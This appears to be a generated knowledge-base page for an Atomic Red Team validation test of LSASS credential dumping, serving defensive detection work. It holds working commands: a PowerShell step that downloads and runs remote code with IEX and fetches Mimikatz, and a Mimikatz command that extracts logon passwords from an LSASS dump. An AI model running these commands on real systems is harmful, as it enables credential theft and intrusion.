---
atomic_guid: "453acf13-1dbd-47d7-b28a-172ce9228023"
title: "Offline Credential Theft With Mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "453acf13-1dbd-47d7-b28a-172ce9228023"
  - "Offline Credential Theft With Mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Offline Credential Theft With Mimikatz

The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.

## Metadata

- Atomic GUID: 453acf13-1dbd-47d7-b28a-172ce9228023
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Input Arguments

### input_file

- description: Path of the Lsass dump
- type: path
- default: %tmp%\lsass.DMP

### mimikatz_exe

- description: Path of the Mimikatz binary
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe

## Dependencies

Mimikatz must exist on disk at specified location (#{mimikatz_exe})

### Prerequisite Check

```powershell
if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$basePath = Split-Path "#{mimikatz_exe}" | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

Lsass dump must exist at specified location (#{input_file})

### Prerequisite Check

```powershell
cmd /c "if not exist #{input_file} (exit /b 1)"
```

### Get Prerequisite

```powershell
Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
